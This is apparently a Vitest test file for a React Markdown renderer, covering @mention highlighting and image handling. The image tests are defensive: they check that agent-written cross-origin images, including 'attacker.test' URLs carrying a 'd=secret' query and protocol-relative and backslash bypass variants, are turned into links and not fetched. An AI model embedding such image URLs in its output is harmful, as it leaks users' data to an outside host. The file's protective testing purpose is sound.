import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";
import { MarkdownMentionContext } from "./markdown-mention-context.js";
import { RichMarkdown } from "./rich-markdown.js";

describe("mentions in Markdown", () => {
  it("highlights known @handles in prose but not in code, links, or longer words", () => {
    const html = renderToStaticMarkup(
      <MarkdownMentionContext
        value={{
          handles: ["ada"],
          render: (handle, text) => <mark data-handle={handle}>{text}</mark>,
        }}
      >
        <RichMarkdown>
          {"Thanks @Ada, ask @adam. See `@ada` and [@ada](https://x.test)."}
        </RichMarkdown>
      </MarkdownMentionContext>,
    );
    expect(
      [...html.matchAll(/<mark data-handle="(\w+)">([^<]*)<\/mark>/g)].map(
        ([, handle, text]) => [handle, text],
      ),
    ).toEqual([["ada", "@Ada"]]);
    expect(html).toContain("<code>@ada</code>");
    expect(html).toContain(">@ada</a>");
  });
});

describe("images in Markdown", () => {
  it("never fetches agent-written cross-origin images, but links to them", () => {
    const remote = [
      "https://attacker.test/leak.png?d=secret",
      "HTTP://attacker.test/upper.png",
      "//attacker.test/relative-protocol.png",
      "/\\attacker.test/backslash.png",
    ];
    const html = renderToStaticMarkup(
      <RichMarkdown>
        {[
          ...remote.map((url, index) => `![chart ${index}](${url})`),
          "![reference][leak]",
          "",
          "[leak]: https://attacker.test/reference.png",
        ].join("\n\n")}
      </RichMarkdown>,
    );
    const fetched = [...html.matchAll(/<img src="([^"]*)"/g)].map(
      ([, src]) => new URL(src ?? "", "https://dx.invalid/thread").host,
    );
    expect(fetched.filter((host) => host !== "dx.invalid")).toEqual([]);
    expect(html).toContain('href="https://attacker.test/leak.png?d=secret"');
    expect(html).toContain('href="https://attacker.test/reference.png"');
    expect(html).toContain("chart 0");
  });

  it("keeps a linked remote image's link target without nesting links", () => {
    const html = renderToStaticMarkup(
      <RichMarkdown>
        {
          "[![build](https://img.shields.io/badge/ci-passing-green)](https://github.com/acme/repo/actions)"
        }
      </RichMarkdown>,
    );
    expect(
      [...html.matchAll(/<a\s[^>]*href="([^"]*)"/g)].map(([, href]) => href),
    ).toEqual(["https://github.com/acme/repo/actions"]);
    expect(html).toContain("build");
    expect(html).not.toContain("<img");
  });

  it("keeps the alt text of an image whose URL is not allowed", () => {
    const html = renderToStaticMarkup(
      <RichMarkdown>
        {"![architecture diagram](data:image/png;base64,AAAA)"}
      </RichMarkdown>,
    );
    expect(html).toContain("architecture diagram");
    expect(html).not.toContain("<img");
    expect(html).not.toContain("data:image");
  });

  it("shows same-origin images inline", () => {
    const html = renderToStaticMarkup(
      <RichMarkdown>
        {"![screenshot](/v1/attachments/att_1/screenshot.png)"}
      </RichMarkdown>,
    );
    expect(html).toContain('<img src="/v1/attachments/att_1/screenshot.png"');
  });
});
